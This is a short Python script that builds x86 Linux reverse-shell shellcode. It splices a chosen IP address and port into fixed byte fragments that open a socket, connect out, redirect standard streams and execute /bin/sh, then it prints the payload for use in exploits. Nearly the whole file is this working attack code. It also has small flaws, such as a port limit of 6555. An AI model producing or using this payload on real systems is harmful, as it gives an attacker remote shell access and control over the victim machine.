#!/usr/bin/python3
import sys;
import socket;

shellcodeBeforeIP = "\\x31\\xc0\\x31\\xdb\\xb3\\x01\\x50\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc7\\x31\\xc0\\xfe\\xc3\\xfe\\xc3\\x68"
shellcodeAfterIP = "\\x66\\x68"
shellcodeAfterPort = "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x89\\xfb\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x66\\x49\\x79\\xf4\\x31\\xc0\\x89\\xc1\\x89\\xc2\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\xb0\\x0b\\xcd\\x80"

if (len(sys.argv) == 1) or (len(sys.argv) == 2):
  port = 1337
  ip= "127.0.0.1"
else:
  ip = sys.argv[1]
  port = int(sys.argv[2])
  if port < 1 or port > 6555:
    print("Specify a real port")
    exit()

portNetwork = hex(socket.htons(int(port)))
portShell = "\\x"  + portNetwork[4:6] + "\\x" + portNetwork[2:4]

ipDivided = ip.split('.')
ipShell = ""
for byte in ipDivided:
  ipShell += "\\" + format(int(byte), '#04x')[1:]

shellcode = shellcodeBeforeIP + ipShell + shellcodeAfterIP + portShell + shellcodeAfterPort
if "00" in shellcode:
  print("There was a null byte found in the shellcode. Please change the port or the shellcode!")
print(shellcode)